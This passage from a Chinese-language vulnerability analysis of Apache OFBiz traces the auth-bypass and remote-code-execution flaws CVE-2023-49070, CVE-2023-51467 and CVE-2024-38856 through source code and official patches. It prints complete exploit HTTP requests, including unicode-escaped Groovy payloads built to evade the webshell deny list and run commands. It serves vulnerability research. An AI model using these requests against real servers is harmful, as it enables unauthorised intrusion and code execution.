response) != <span class="literal">null</span>) &#123;</span><br><span class="line">        request.removeAttribute(<span class="string">&quot;_ERROR_MESSAGE_LIST_&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;impersonated&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;success&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2024/12/18/Cursory-Analysis-Of-Apache-OFBiz/1734402943170-70799cc4-b629-47de-a925-20eba49c0d56.png"></p>
<p><font style="color:#000000;">跟进org.apache.ofbiz.webapp.control.LoginWorker#login方法，注意到如下几行代码，可以看到当unpwErrMsgList不为空且requirePasswordChange参数值为Y时，返回的结果即为requirePasswordChange而不是error，满足前文绕过需求。而要使得unpwErrMsgList不为，则需要满足username为空或者password和token同时为空，因此可以构造传参为</font><strong><font style="color:#000000;">USERNAME&#x3D;&amp;PASSWORD&#x3D;&amp;token&#x3D;&amp;requirePasswordChange&#x3D;Y</font></strong><font style="color:#000000;">。</font></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">List&lt;String&gt; unpwErrMsgList = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;String&gt;();</span><br><span class="line"><span class="keyword">if</span> (UtilValidate.isEmpty(username)) &#123;</span><br><span class="line">    unpwErrMsgList.add(UtilProperties.getMessage(resourceWebapp, <span class="string">&quot;loginevents.username_was_empty_reenter&quot;</span>, UtilHttp.getLocale(request)));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (UtilValidate.isEmpty(password) &amp;&amp; UtilValidate.isEmpty(token)) &#123;</span><br><span class="line">    unpwErrMsgList.add(UtilProperties.getMessage(resourceWebapp, <span class="string">&quot;loginevents.password_was_empty_reenter&quot;</span>, UtilHttp.getLocale(request)));</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">boolean</span> <span class="variable">requirePasswordChange</span> <span class="operator">=</span> <span class="string">&quot;Y&quot;</span>.equals(request.getParameter(<span class="string">&quot;requirePasswordChange&quot;</span>));</span><br><span class="line"><span class="keyword">if</span> (!unpwErrMsgList.isEmpty()) &#123;</span><br><span class="line">    request.setAttribute(<span class="string">&quot;_ERROR_MESSAGE_LIST_&quot;</span>, unpwErrMsgList);</span><br><span class="line">    <span class="keyword">return</span>  requirePasswordChange ? <span class="string">&quot;requirePasswordChange&quot;</span> : <span class="string">&quot;error&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>漏洞利用数据包如下：</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/webtools/control/xmlrpc/;/?USERNAME=&amp;PASSWORD=&amp;token=&amp;requirePasswordChange=Y</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:8443</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/xml</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>4093</span><br><span class="line"></span><br><span class="line"><span class="language-handlebars"><span class="language-xml"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"><span class="tag">&lt;<span class="name">methodCall</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"><span class="tag">&lt;<span class="name">methodName</span>&gt;</span></span><span class="template-variable">&#123;&#123;<span class="name">Random_String</span>&#125;&#125;</span><span class="language-xml"><span class="tag">&lt;/<span class="name">methodName</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"><span class="tag">&lt;<span class="name">params</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">    <span class="tag">&lt;<span class="name">param</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">    <span class="tag">&lt;<span class="name">value</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">        <span class="tag">&lt;<span class="name">struct</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">        <span class="tag">&lt;<span class="name">member</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">            <span class="tag">&lt;<span class="name">name</span>&gt;</span></span><span class="template-variable">&#123;&#123;<span class="name">Random_String</span>&#125;&#125;</span><span class="language-xml"><span class="tag">&lt;/<span class="name">name</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">            <span class="tag">&lt;<span class="name">value</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">            <span class="tag">&lt;<span class="name">serializable</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://ws.apache.org/xmlrpc/namespaces/extensions&quot;</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">           </span><span class="template-variable">&#123;&#123;<span class="name">Base64_Payload</span>&#125;&#125;</span><span class="language-xml"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">            <span class="tag">&lt;/<span class="name">serializable</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">            <span class="tag">&lt;/<span class="name">value</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">        <span class="tag">&lt;/<span class="name">member</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">        <span class="tag">&lt;/<span class="name">struct</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">    <span class="tag">&lt;/<span class="name">value</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">    <span class="tag">&lt;/<span class="name">param</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"><span class="tag">&lt;/<span class="name">params</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"><span class="tag">&lt;/<span class="name">methodCall</span>&gt;</span></span></span></span><br></pre></td></tr></table></figure>

<p><img src="/2024/12/18/Cursory-Analysis-Of-Apache-OFBiz/1734404509876-d372a125-2707-4e7b-b8f2-0fad19ca5cd7.png"></p>
<p><font style="color:#000000;">OBFiz官方对于CVE-2023-49070的修复方式是直接移除了XML-RPC相关的逻辑</font><a target="_blank" rel="noopener" href="https://github.com/apache/ofbiz-framework/commit/c59336f604f503df5b2f7c424fd5e392d5923a27">https://github.com/apache/ofbiz-framework/commit/c59336f604f503df5b2f7c424fd5e392d5923a27</a><font style="color:#000000;">，但是认证绕过的问题其实并没有处理。</font></p>
<h3 id="CVE-2023-51467"><a href="#CVE-2023-51467" class="headerlink" title="CVE-2023-51467"></a><font style="color:rgb(51, 51, 51);">CVE-2023-51467</font></h3><p><font style="color:#000000;">上文在分析CVE-2023-49070时，其补丁并未修复认证绕过的问题，因此导致了依旧可以利用鉴权绕过来访问任意接口。在后台中，注意到路由webtools&#x2F;control&#x2F;ProgramExport可以执行Groovy脚本。</font></p>
<p><img src="/2024/12/18/Cursory-Analysis-Of-Apache-OFBiz/1734432201978-9aeb7a72-c23b-4099-9f5d-0c16d4c5e687.png"></p>
<p><font style="color:#000000;">跟进一下ProgramExport对应的视图配置，可以看到会去调用ProgramExport.groovy来执行Groovy脚本。</font></p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">view-map</span> <span class="attr">name</span>=<span class="string">&quot;ProgramExport&quot;</span> <span class="attr">type</span>=<span class="string">&quot;screen&quot;</span> <span class="attr">page</span>=<span class="string">&quot;component://webtools/widget/EntityScreens.xml#ProgramExport&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">screen</span> <span class="attr">name</span>=<span class="string">&quot;ProgramExport&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">section</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">actions</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">set</span> <span class="attr">field</span>=<span class="string">&quot;titleProperty&quot;</span> <span class="attr">value</span>=<span class="string">&quot;PageTitleEntityExportAll&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">set</span> <span class="attr">field</span>=<span class="string">&quot;tabButtonItem&quot;</span> <span class="attr">value</span>=<span class="string">&quot;programExport&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">script</span> <span class="attr">location</span>=<span class="string">/</span>&gt;</span><span class="language-handlebars"><span class="language-xml"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">        <span class="tag">&lt;/<span class="name">actions</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">        <span class="tag">&lt;<span class="name">widgets</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">            <span class="tag">&lt;<span class="name">decorator-screen</span> <span class="attr">name</span>=<span class="string">&quot;CommonImportExportDecorator&quot;</span> <span class="attr">location</span>=<span class="string">&quot;$&#123;parameters.mainDecoratorLocation&#125;&quot;</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">                <span class="tag">&lt;<span class="name">decorator-section</span> <span class="attr">name</span>=<span class="string">&quot;body&quot;</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">                     <span class="tag">&lt;<span class="name">screenlet</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">                        <span class="tag">&lt;<span class="name">include-form</span> <span class="attr">name</span>=<span class="string">&quot;ProgramExport&quot;</span> <span class="attr">location</span>=<span class="string">&quot;component://webtools/widget/MiscForms.xml&quot;</span>/&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">                    <span class="tag">&lt;/<span class="name">screenlet</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">                    <span class="tag">&lt;<span class="name">screenlet</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">                        <span class="tag">&lt;<span class="name">platform-specific</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">                            <span class="tag">&lt;<span class="name">html</span>&gt;</span><span class="tag">&lt;<span class="name">html-template</span> <span class="attr">location</span>=<span class="string">&quot;component://webtools/template/entity/ProgramExport.ftl&quot;</span>/&gt;</span><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">                        <span class="tag">&lt;/<span class="name">platform-specific</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">                    <span class="tag">&lt;/<span class="name">screenlet</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">                <span class="tag">&lt;/<span class="name">decorator-section</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">            <span class="tag">&lt;/<span class="name">decorator-screen</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">        <span class="tag">&lt;/<span class="name">widgets</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">    <span class="tag">&lt;/<span class="name">section</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"><span class="tag">&lt;/<span class="name">screen</span>&gt;</span></span></span></span><br></pre></td></tr></table></figure>

<p><font style="color:#000000;">在ProgramExport.groovy中，利用org.apache.ofbiz.security.SecuredUpload#isValidText方法来检测是否是Webshell。</font></p>
<p><img src="/2024/12/18/Cursory-Analysis-Of-Apache-OFBiz/1734432652162-59c17798-e92d-4393-9fef-b9ed9fab6978.png"></p>
<p><font style="color:#000000;">在SecuredUpload#isValidText方法中，通过读取配置文件</font><font style="color:rgb(6, 6, 7);">来获取不允许的WebShell Token。</font></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">isValidText</span><span class="params">(String content, List&lt;String&gt; allowed)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="keyword">return</span> content != <span class="literal">null</span> ? DENIEDWEBSHELLTOKENS.stream().allMatch(token -&gt; isValid(content, token.toLowerCase(), allowed)) : <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> List&lt;String&gt; DENIEDWEBSHELLTOKENS = getDeniedWebShellTokens();</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> List&lt;String&gt; <span class="title function_">getDeniedWebShellTokens</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">deniedTokens</span> <span class="operator">=</span> UtilProperties.getPropertyValue(<span class="string">&quot;security&quot;</span>, <span class="string">&quot;deniedWebShellTokens&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> UtilValidate.isNotEmpty(deniedTokens) ? StringUtil.split(deniedTokens, <span class="string">&quot;,&quot;</span>) : <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2024/12/18/Cursory-Analysis-Of-Apache-OFBiz/1734433494354-d3abea17-dda4-4429-b267-8444850a57c7.png"></p>
<p>简单Bypass以下即可实现RCE的目的，例如字符拼接或者编码等。</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/webtools/control/ProgramExport?USERNAME=&amp;PASSWORD=&amp;token=&amp;requirePasswordChange=Y</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate, br, zstd</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>618</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:8443</span><br><span class="line"><span class="attribute">Sec-Fetch-Dest</span><span class="punctuation">: </span>document</span><br><span class="line"><span class="attribute">Sec-Fetch-Mode</span><span class="punctuation">: </span>navigate</span><br><span class="line"><span class="attribute">Sec-Fetch-Site</span><span class="punctuation">: </span>same-origin</span><br><span class="line"><span class="attribute">Sec-Fetch-User</span><span class="punctuation">: </span>?1</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">sec-ch-ua</span><span class="punctuation">: </span>&quot;Google Chrome&quot;;v=&quot;131&quot;, &quot;Chromium&quot;;v=&quot;131&quot;, &quot;Not_A Brand&quot;;v=&quot;24&quot;</span><br><span class="line"><span class="attribute">sec-ch-ua-mobile</span><span class="punctuation">: </span>?0</span><br><span class="line"><span class="attribute">sec-ch-ua-platform</span><span class="punctuation">: </span>&quot;macOS&quot;</span><br><span class="line"></span><br><span class="line"><span class="language-taggerscript">groovyProgram=<span class="symbol">\u006a</span><span class="symbol">\u0061</span><span class="symbol">\u0076</span><span class="symbol">\u0061</span><span class="symbol">\u002e</span><span class="symbol">\u006c</span><span class="symbol">\u0061</span><span class="symbol">\u006e</span><span class="symbol">\u0067</span><span class="symbol">\u002e</span><span class="symbol">\u0052</span><span class="symbol">\u0075</span><span class="symbol">\u006e</span><span class="symbol">\u0074</span><span class="symbol">\u0069</span><span class="symbol">\u006d</span><span class="symbol">\u0065</span><span class="symbol">\u002e</span><span class="symbol">\u0067</span><span class="symbol">\u0065</span><span class="symbol">\u0074</span><span class="symbol">\u0052</span><span class="symbol">\u0075</span><span class="symbol">\u006e</span><span class="symbol">\u0074</span><span class="symbol">\u0069</span><span class="symbol">\u006d</span><span class="symbol">\u0065</span><span class="symbol">\u0028</span><span class="symbol">\u0029</span><span class="symbol">\u002e</span><span class="symbol">\u0065</span><span class="symbol">\u0078</span><span class="symbol">\u0065</span><span class="symbol">\u0063</span><span class="symbol">\u0028</span><span class="symbol">\u0022</span><span class="symbol">\u0074</span><span class="symbol">\u006f</span><span class="symbol">\u0075</span><span class="symbol">\u0063</span><span class="symbol">\u0068</span><span class="symbol">\u0020</span><span class="symbol">\u002f</span><span class="symbol">\u0074</span><span class="symbol">\u006d</span><span class="symbol">\u0070</span><span class="symbol">\u002f</span><span class="symbol">\u0068</span><span class="symbol">\u0061</span><span class="symbol">\u0063</span><span class="symbol">\u006b</span><span class="symbol">\u0065</span><span class="symbol">\u0072</span><span class="symbol">\u0022</span><span class="symbol">\u0029</span></span></span><br></pre></td></tr></table></figure>

<p><img src="/2024/12/18/Cursory-Analysis-Of-Apache-OFBiz/1734434095854-7988ada2-1c70-4db6-8b60-88b141df4623.png"></p>
<p>官方补丁<a target="_blank" rel="noopener" href="https://github.com/apache/ofbiz-framework/commit/d8b097f6717a4004acf023dfe929e0e41ad63faa#diff-68decfd4946b8ef0adcc4c7f18b938aec4a07ff7ce64609a2691ba88a4688607L426">https://github.com/apache/ofbiz-framework/commit/d8b097f6717a4004acf023dfe929e0e41ad63faa#diff-68decfd4946b8ef0adcc4c7f18b938aec4a07ff7ce64609a2691ba88a4688607L426</a>对于之前的用户名、密码等置空绕过部分进行了检测，禁止为空字符串。</p>
<h3 id="CVE-2024-38856"><a href="#CVE-2024-38856" class="headerlink" title="CVE-2024-38856"></a><font style="color:#000000;">CVE-2024-38856</font></h3><p><font style="color:#000000;">在RequestHandler#doRequest方法中，利用getRequestUri方法来获取请求URI的基础部分，将pathInfo按&#x2F;分割成一个字符串列表，若不为空则取第一个元素，当包含?时，取?之前部分；利用getOverrideViewUri方法来获取用于覆盖视图的URI部分，同样将pathInfo按&#x2F;分割成一个字符串列表，忽略列表中第一个元素并遍历剩余的元素（忽略~开头的元素），当包含?时，取?之前部分，将列表剩余符合元素拼接起来。</font></p>
<p><img src="/2024/12/18/Cursory-Analysis-Of-Apache-OFBiz/1734448297486-1d615bc2-3fcc-42bc-a75d-bc5bf9a8862e.png"></p>
<p><img src="/2024/12/18/Cursory-Analysis-Of-Apache-OFBiz/1734447710724-f8334bd2-1957-4a34-b1cb-e1e8b4022b35.png"></p>
<p><font style="color:#000000;">在默认情况下，渲染的视图为nextRequestResponse.value，即根据路由的返回结果来自动选择视图，这里分为三种情况：</font></p>
<ol>
<li><strong><font style="color:#000000;">定义了event的路由（通常无需鉴权），会根据对应event的执行结果决定渲染类型</font></strong></li>
<li><strong><font style="color:#000000;">没有定义event但security中auth为true的路由，会根据认证返回结果决定渲染类型</font></strong></li>
<li><strong><font style="color:#000000;">既没有定义event、又缺乏认证的路由，这种会直接取配置中success的结果对应的值作为渲染类型</font></strong></li>
</ol>
<p><font style="color:#000000;">接着会校验requestUri是否需要认证，这里利用security值为true的路由来绕过检查。</font></p>
<p><img src="/2024/12/18/Cursory-Analysis-Of-Apache-OFBiz/1734449240291-4a5c82cf-e126-40bd-a290-70d84d3e7db7.png"></p>
<p><font style="color:#000000;">继续往下，在runEvent方法中，通过反射调用到利用路由的业务方法，满足返回值为success即可。</font></p>
<p><img src="/2024/12/18/Cursory-Analysis-Of-Apache-OFBiz/1734449717683-b909bbe3-3800-405c-85ad-fb38a14668ec.png"></p>
<p><font style="color:#000000;">接着判断nextRequestResponse.type的值，可以在配置文件中查看。</font></p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">request-map</span> <span class="attr">uri</span>=<span class="string">&quot;forgotPassword&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">security</span> <span class="attr">https</span>=<span class="string">&quot;true&quot;</span> <span class="attr">auth</span>=<span class="string">&quot;false&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">event</span> <span class="attr">type</span>=<span class="string">&quot;java&quot;</span> <span class="attr">path</span>=<span class="string">&quot;org.apache.ofbiz.securityext.login.LoginEvents&quot;</span> <span class="attr">invoke</span>=<span class="string">&quot;forgotPassword&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">response</span> <span class="attr">name</span>=<span class="string">&quot;success&quot;</span> <span class="attr">type</span>=<span class="string">&quot;view&quot;</span> <span class="attr">value</span>=<span class="string">&quot;forgotPassword&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">response</span> <span class="attr">name</span>=<span class="string">&quot;error&quot;</span> <span class="attr">type</span>=<span class="string">&quot;view&quot;</span> <span class="attr">value</span>=<span class="string">&quot;forgotPassword&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">response</span> <span class="attr">name</span>=<span class="string">&quot;auth&quot;</span> <span class="attr">type</span>=<span class="string">&quot;request-redirect&quot;</span> <span class="attr">value</span>=<span class="string">&quot;main&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">request-map</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><font style="color:#000000;">进入对应的语句，可以看到，当overrideViewUri不为空，且eventReturn的值为success时，会将视图渲染为overrideViewUri。</font></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">&quot;view&quot;</span>.equals(nextRequestResponse.type)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (Debug.verboseOn()) Debug.logVerbose(<span class="string">&quot;[RequestHandler.doRequest]: Response is a view.&quot;</span> + showSessionId(request), <span class="keyword">module</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// check for an override view, only used if &quot;success&quot; = eventReturn</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">viewName</span> <span class="operator">=</span> (UtilValidate.isNotEmpty(overrideViewUri) &amp;&amp; (eventReturn == <span class="literal">null</span> || <span class="string">&quot;success&quot;</span>.equals(eventReturn))) ? overrideViewUri : nextRequestResponse.value;</span><br><span class="line">    renderView(viewName, requestMap.securityExternalView, request, response, saveName);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><font style="color:#000000;">因此，可以利用不鉴权且路由的type为view的路由来作为requestUri的值，然后overrideViewUri设置为需要利用的路由，就可以实现前序步骤的权限校验绕过，同时将视图渲染为目标视图。同时可以利用getOverrideViewUri方法处理时的特性来绕过部分流量检测。</font></p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/webtools/control/forgotPassword/~aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa/ProgramExport</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate, br, zstd</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>52</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:8443</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>https://127.0.0.1:8443</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>https://127.0.0.1:8443/scrum/control/login</span><br><span class="line"><span class="attribute">Sec-Fetch-Dest</span><span class="punctuation">: </span>document</span><br><span class="line"><span class="attribute">Sec-Fetch-Mode</span><span class="punctuation">: </span>navigate</span><br><span class="line"><span class="attribute">Sec-Fetch-Site</span><span class="punctuation">: </span>same-origin</span><br><span class="line"><span class="attribute">Sec-Fetch-User</span><span class="punctuation">: </span>?1</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">sec-ch-ua</span><span class="punctuation">: </span>&quot;Google Chrome&quot;;v=&quot;131&quot;, &quot;Chromium&quot;;v=&quot;131&quot;, &quot;Not_A Brand&quot;;v=&quot;24&quot;</span><br><span class="line"><span class="attribute">sec-ch-ua-mobile</span><span class="punctuation">: </span>?0</span><br><span class="line"><span class="attribute">sec-ch-ua-platform</span><span class="punctuation">: </span>&quot;macOS&quot;</span><br><span class="line"></span><br><span class="line"><span class="language-taggerscript">groovyProgram=<span class="symbol">\u0022</span><span class="symbol">\u0074</span><span class="symbol">\u006f</span><span class="symbol">\u0075</span><span class="symbol">\u0063</span><span class="symbol">\u0068</span><span class="symbol">\u0020</span><span class="symbol">\u002f</span><span class="symbol">\u0074</span><span class="symbol">\u006d</span><span class="symbol">\u0070</span><span class="symbol">\u002f</span><span class="symbol">\u0068</span><span class="symbol">\u0061</span><span class="symbol">\u0063</span><span class="symbol">\u006b</span><span class="symbol">\u0065</span><span class="symbol">\u0072</span><span class="symbol">\u0022</span><span class="symbol">\u002e</span><span class="symbol">\u0065</span><span class="symbol">\u0078</span><span class="symbol">\u0065</span><span class="symbol">\u0063</span><span class="symbol">\u0075</span><span class="symbol">\u0074</span><span class="symbol">\u0065</span><span class="symbol">\u0028</span><span class="symbol">\u0029</span></span></span><br></pre></td></tr></table></figure>

